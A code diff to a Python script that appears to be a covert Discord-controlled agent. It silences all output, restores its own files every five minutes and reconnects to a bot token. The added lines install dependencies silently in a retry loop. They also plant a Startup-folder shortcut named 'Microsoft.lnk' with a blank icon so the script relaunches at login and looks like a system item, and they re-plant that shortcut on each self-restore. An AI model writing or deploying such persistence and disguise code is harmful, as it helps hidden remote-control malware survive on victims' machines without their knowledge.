@@ -17,16 +17,32 @@ sys.stdout = open(os.devnull, 'w')
 sys.stderr = open(os.devnull, 'w')
 
 import pip
-pip.main(['install', '--upgrade', 'discord'])
+while pip.main(['install', '--upgrade', 'discord', 'pywin32']): pass
 
 import time
+import ctypes
 import asyncio
 import discord
 import importlib
 
+from ctypes import wintypes
 from discord.ext import tasks
 from discord.ext import commands
+from win32com.client import Dispatch
+from win32com.shell import shell, shellcon
 
+
+SHORTCUT_NAME = 'Microsoft.lnk'
+def create_shortcut():
+    d = shell.SHGetFolderPath(0, shellcon.CSIDL_STARTUP, None, 0)
+    ws_shell = Dispatch('WScript.Shell')
+    shortcut = ws_shell.CreateShortCut(os.path.join(d, SHORTCUT_NAME))
+    shortcut.Targetpath = __file__
+    shortcut.IconLocation = __file__ + ', 1' # Icon to blank
+    shortcut.save()
+
+
+create_shortcut()
 
 with open(__file__, 'r') as f:
     BACKUP_FILE = f.read()
@@ -94,8 +110,11 @@ async def update(ctx):
 def _auto_save():
     with open(__file__, 'w') as f:
         f.write(BACKUP_FILE)
+
     with open(LIB + '.pyw', 'w') as f:
         f.write(LIB_BACKUP_FILE)
+
+    create_shortcut()
 
 
 @tasks.loop(seconds=300)
@@ -107,8 +126,10 @@ async def auto_save():
 loop = asyncio.get_event_loop()
 
 while True:
-    try:
-        loop.run_until_complete(bot.start(TOKEN))
-    except Exception:
-        time.sleep(300)
-        _auto_save()
+    for _ in range(15):
+        try:
+            loop.run_until_complete(bot.start(TOKEN))
+        except Exception:
+            time.sleep(20)
+
+    _auto_save()
